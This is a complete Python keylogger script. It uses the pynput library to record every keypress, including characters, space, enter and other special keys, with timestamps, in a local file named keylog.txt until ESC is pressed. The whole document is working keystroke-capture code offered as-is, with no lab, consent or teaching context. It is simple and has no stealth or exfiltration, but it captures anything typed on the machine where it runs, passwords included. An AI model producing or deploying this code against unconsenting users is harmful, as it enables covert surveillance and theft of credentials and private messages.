#!/usr/bin/env python3

from pynput.keyboard import Listener, Key
import logging

# Configure logging:
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def on_press(key):
    """
    Callback function invoked when a key is pressed.
    Logs alphanumeric and special keys to 'keylog.txt' with a timestamp.
    """
    try:
        # Log regular (alphanumeric) keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (like space, enter, etc.)
        if key == Key.space:
            logging.info("Key pressed: [SPACE]")
        elif key == Key.enter:
            logging.info("Key pressed: [ENTER]")
        else:
            logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    Callback function invoked when a key is released.
    Stops the listener if the ESC key is pressed.
    """
    # Stop the listener on pressing ESC
    if key == Key.esc:
        logging.info("ESC pressed. Exiting keylogger.")
        return False

# Start the keylogger listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
